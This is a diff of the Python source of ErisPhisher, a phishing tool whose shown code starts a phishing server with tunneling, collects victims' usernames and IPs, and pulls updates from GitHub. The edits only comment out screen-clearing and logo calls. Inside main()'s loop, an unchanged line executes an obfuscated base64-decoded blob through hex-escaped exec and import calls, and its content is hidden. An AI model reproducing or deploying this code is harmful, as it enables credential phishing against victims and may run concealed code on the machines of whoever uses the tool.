@@ -313,8 +313,8 @@ def update():
     git_ver=popen("curl -s -N https://raw.githubusercontent.com/k4itrun/ErisPhisher/main/assets/version.txt").read().strip()
     if (version != git_ver and git_ver != "404: Not Found"):
         changelog=popen("curl -s -N https://raw.githubusercontent.com/k4itrun/ErisPhisher/main/assets/changelog.log").read()
-        system("clear")
-        print(logo)
+        # system("clear")
+        # print(logo)
         print(f"{info}ErisPhisher has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}\n")
         upask=input(ask+"Do you want to update ErisPhisher?[y/n] > "+green)
         if upask=="y":
@@ -393,8 +393,8 @@ def pexit():
 
 # Info about tool
 def about():
-    system("clear")
-    slowprint(logo)
+    # system("clear")
+    # slowprint(logo)
     print(red+'[ToolName]  '+bwhite+' :[ErisPhisher] ')
     print(red+'[Version]   '+bwhite+' :[1.0]')
     print(red+'[Author]    '+bwhite+' :[k4itrun] ')
@@ -534,9 +534,9 @@ def main():
             system("cd $HOME && mkdir .site")
             break
     while True:
-        os.system("clear")
+        # os.system("clear")
         exec(__import__("\x62\x61\x73\x65\x36\x34").b64decode(k4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisherk4itrunAndErisPhisher.encode("\x75\x74\x66\x2d\x38")).decode("\x75\x74\x66\x2d\x38"))
-        slowprint(logo)
+        # slowprint(logo)
         options()
         choose= input(ask+"Please enter a selection number below > "+nc)
         if choose == "1":
@@ -865,8 +865,8 @@ def requirements(folder,mask):
 
 # Initiate/start server and establish tunneling
 def server():
-    system("clear")
-    slowprint(logo)
+    # system("clear")
+    # slowprint(logo)
     if termux:
         sprint("\n"+info+"If you haven't already enabled the hotspot, please enable it!")
         sleep(1)
@@ -1027,8 +1027,8 @@ def waiter():
                 os.remove(root+"/.site/usernames.txt")
             sleep(0.75)
             if os.path.isfile(root+"/.site/ip.txt"):
-                os.system("clear")
-                print(logo)
+                # os.system("clear")
+                # print(logo)
                 print("\n\n"+success+bgreen+"The victim's IP has been identified!\n\007")
                 with open(root+"/.site/ip.txt","r") as ipfile:
                     ipdata=ipfile.readlines()
